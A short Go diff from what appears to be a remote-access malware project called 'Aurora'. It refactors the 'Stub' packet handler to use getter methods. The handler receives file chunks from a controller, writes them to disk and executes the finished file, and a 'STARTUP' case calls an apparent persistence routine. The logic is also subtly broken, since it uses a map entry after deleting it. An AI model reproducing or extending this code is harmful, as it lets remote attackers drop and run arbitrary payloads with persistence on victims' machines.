@@ -1,6 +1,7 @@
 package internal
 
 import (
+	. "Aurora/src/util"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -61,8 +62,8 @@ func (stub *Stub) handlePackets() {
 		} else if err != nil {
 			return
 		} else {
-			fmt.Println(packet.Type)
-			switch packet.Type {
+			fmt.Println(packet.GetForm())
+			switch packet.GetForm() {
 			case "FILE":
 				if _, err := os.Stat(stub.td); os.IsNotExist(err) {
 					err := os.MkdirAll(stub.td, os.ModeDir)
@@ -70,25 +71,25 @@ func (stub *Stub) handlePackets() {
 						fmt.Println(err)
 					}
 				}
-				fileName := stub.td + "\\" + packet.StringData
-				if packet.Done && files[fileName] != nil {
+				fileName := stub.td + "\\" + packet.GetStringData()
+				if packet.GetComplete() && files[fileName] != nil {
 					files[fileName].Close()
 					delete(files, fileName)
-					fmt.Println("Stub: Finished downloading", packet.StringData)
+					fmt.Println("Stub: Finished downloading", packet.GetStringData())
 					Exec := exec.Command(files[fileName].Name())
 					Exec.Start()
-				} else if packet.Done && files[fileName] == nil {
+				} else if packet.GetComplete() && files[fileName] == nil {
 					continue
 				} else {
 					if files[fileName] == nil {
-						fmt.Println("Stub: Started downloading", packet.StringData)
+						fmt.Println("Stub: Started downloading", packet.GetStringData())
 						if _, err := os.Stat(fileName); os.IsNotExist(err) {
 							files[fileName], _ = os.Create(fileName)
 						} else {
 							files[fileName], _ = os.Open(fileName)
 						}
 					}
-					files[fileName].WriteAt(packet.FileData, packet.BytePos*1024)
+					files[fileName].WriteAt(packet.GetFileData(), packet.GetBytePos()*1024)
 				}
 			case "STARTUP":
 				addStartup()
